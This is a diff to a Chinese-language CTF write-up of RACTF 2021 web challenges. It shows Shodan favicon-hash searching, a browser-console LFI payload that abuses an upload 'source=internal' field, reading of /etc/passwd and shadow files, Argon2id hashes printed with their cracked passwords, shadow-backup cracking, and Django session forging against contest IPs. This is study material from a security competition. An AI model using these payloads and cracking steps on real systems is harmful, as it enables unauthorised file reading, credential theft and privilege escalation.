@@ -14,10 +14,14 @@
 
 ![ractf20212](img/ractf2021/ractf20212.png)
 
-有问题的是`favicon.ico`，将网站图标下载下来，可以通过脚本计算它的`mmh3`哈希，得到`-915494641`
+有问题的是`favicon.ico`，将网站图标下载下来，可以通过脚本计算它的`mmh3`哈希，得到`-915494641`；然后去`shodan.io`搜索`http.favicon.hash:-915494641`，就会出现两个ip，访问任意一个即可得到`flag`
 
-```
-![ractf20214](img/ractf2021/ractf20214.png)import base64
+![ractf20213](img/ractf2021/ractf20213.png)
+
+### payload
+
+```python
+import base64
 import mmh3
 
 with open('favicon.ico', 'rb') as file:
@@ -26,11 +30,9 @@ with open('favicon.ico', 'rb') as file:
     print(hash)
 ```
 
-然后去`shodan.io`搜索`http.favicon.hash:-915494641`，就会出现两个ip，访问任意一个即可得到`flag`
-
-### payload
-
 ## emoji book
+
+> *2021/08/17*
 
 ### 题目
 
@@ -152,6 +154,8 @@ def view_note(request: HttpRequest, pk: int) -> HttpResponse:
 
 
 ## emoji book 2
+
+> *2021/08/30*
 
 ### 题目
 
@@ -302,21 +306,21 @@ DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'
 
 > `windows`和`linux`的`pickle`是跨平台的，但是`os`模块并不是跨平台的
 
-![ractf202112](img/ractf2021/ractf202112.png)
+![ractf20217](img/ractf2021/ractf20217.png)
 
 但是我们并没有权限去访问该文件，但是可以发现他的用户组属于`admin`，访问`/etc/passwd`和`/etc/shadow`还有`/etc/group`
 
-![ractf202113](img/ractf2021/ractf202113.png)
+![ractf20218](img/ractf2021/ractf20218.png)
 
-![ractf202114](img/ractf2021/ractf202114.png)
+![ractf20219](img/ractf2021/ractf20219.png)
 
 从中可以发现，`admin`属于`flag`组，以及`admin`相关的密码信息，`john`爆破
 
-![ractf202115](img/ractf2021/ractf202115.png)
+![ractf202110](img/ractf2021/ractf202110.png)
 
 利用改密码提权拿到`flag`
 
-![ractf202116](img/ractf2021/ractf202116.png)
+![ractf202111](img/ractf2021/ractf202111.png)
 
 ### payload
 
@@ -356,5 +360,126 @@ print(forge_sessionid)
 r = requests.get('http://193.57.159.27:42585',
                  cookies={'sessionid': forge_sessionid})
 print(r.status_code)
+```
+
+## I'm a fan
+
+> *2021/09/01*
+
+### 题目
+
+这道题是一个上传文件，但是跟上传文件那个按钮没太大关系，他上传文件的接口大概是这样
+
+```js
+async function uploadContent(e) {
+    let n = new FormData();
+    a = e.files[0];
+    n.append("file", a);
+    n.append("source", "external");
+    const r = new AbortController();
+    try {
+    	...
+        await fetch("/upload/content", { method: "POST", body: n, signal: r.signal });
+      	....
+}
+```
+
+其实这个`source`参数就很奇怪，他的值为`external`，那是不是我们可以重写该接口包含一个内部文件
+
+```js
+async function LFI(inp){
+    let fd = new FormData();
+    fd.append("file", inp);
+    fd.append("source", "internal");
+    const ctrl = new AbortController()
+
+    try {
+      displayMDCSnackbar("Uploading Video, please wait", 10000)
+       let req = await fetch('/upload/content',
+        {method: "POST", body: fd, signal: ctrl.signal}).then(resp => resp.json()).then(data => displayMDCSnackbar(data.message, 4000));
+       setTimeout(function(){location = ''}, 4000);
+    } catch(e) {
+      setTimeout(function(){location = ''}, 4000);
+      displayMDCSnackbar("Upload Failed: " + e, 4000)
+    }
+}
+```
+
+在`Chrome`的控制台去执行这段代码
+
+![ractf202113](img/ractf2021/ractf202113.png)
+
+等待一段时间，这个页面就会更新
+
+![ractf202114](img/ractf2021/ractf202114.png)
+
+可以看到`/etc/passwd`显示到我们的视频里面，接下来的话，目标就是登录服务器，而我们的服务器是` gunicorn`的，这个是一个 **WSGI HTTP** 服务器
+
+> **WSGI**：全称是 **Web Server Gateway Interface**，**WSGI **不是服务器，python模块，框架，API或者任何软件，只是一种规范，描述 **web server** 如何与 **web application** 通信的规范
+
+而这时候我们就需要去读取一些，可能会出现的一些`python`文件，如`app.py`
+
+![ractf202115](img/ractf2021/ractf202115.png)
+
+可以发现有一个`EXCLUDE_FILE`是`uploads/note.txt`，包含它继续查看
+
+![ractf202116](img/ractf2021/ractf202116.png)
+
+可以看到有两串密码，用的是`Argon2id`算法
+
+- `$argon2id$v=19$m=102400,t=2,p=8$WmI1xK/4Z1fiLj20O2fDpA$7Oy7WAp9gERzT/T5RlDXCw`
+
+- `$argon2id$v=19$m=102400,t=2,p=8$vZaZ9D3ERgo/DOnoNvQkEA$IOxfMIF7cgKbnHalTLU9uA`
+
+可以使用工具`Argon2_Cracker`，或者有弱密码字典，写个脚本爆破也可以，密码分别为`password`和`qwertyuiop`，题干中说`This challenge also has something on port 27830/tcp`，我们直接用`admin`+`passwordqwertyuiop`登录
+
+![ractf202117](img/ractf2021/ractf202117.png)
+
+我们现在需要提权，而该主机的`/etc/shadow`我们并不能直接访问，可能是因为`Alpine linux`。那我们就需要搜索提权需要的东西，如
+
+- 敏感文件
+- `SUID/SGID`的文件
+- ....
+
+> 一般来说，可以先找属于自己用户组的文件
+
+在`/etc`下有一个`shadow-backup.bak`，可以得到文件，再用`john/hashcat`爆破，得到密码`ubisoft`
+
+![ractf202118](img/ractf2021/ractf202118.png)
+
+再去根目录下，即可得到`flag`
+
+![ractf202119](img/ractf2021/ractf202119.png)
+
+### payload
+
+```js
+async function LFI(inp){
+    let fd = new FormData();
+    fd.append("file", inp);
+    fd.append("source", "internal");
+    const ctrl = new AbortController()
+
+    try {
+      displayMDCSnackbar("Uploading Video, please wait", 10000)
+       let req = await fetch('/upload/content',
+        {method: "POST", body: fd, signal: ctrl.signal}).then(resp => resp.json()).then(data => displayMDCSnackbar(data.message, 4000));
+       setTimeout(function(){location = ''}, 4000);
+    } catch(e) {
+      setTimeout(function(){location = ''}, 4000);
+      displayMDCSnackbar("Upload Failed: " + e, 4000)
+    }
+}
+```
+
+```python
+import os
+import io
+from argon2 import PasswordHasher
+
+ph = PasswordHasher()
+#hash = ph.hash("s3kr3tp4ssw0rd")
+hash = '$argon2id$v=19$m=102400,t=2,p=8$WmI1xK/4Z1fiLj20O2fDpA$7Oy7WAp9gERzT/T5RlDXCw'
+print(ph.verify(hash, "password"))
 ```
 
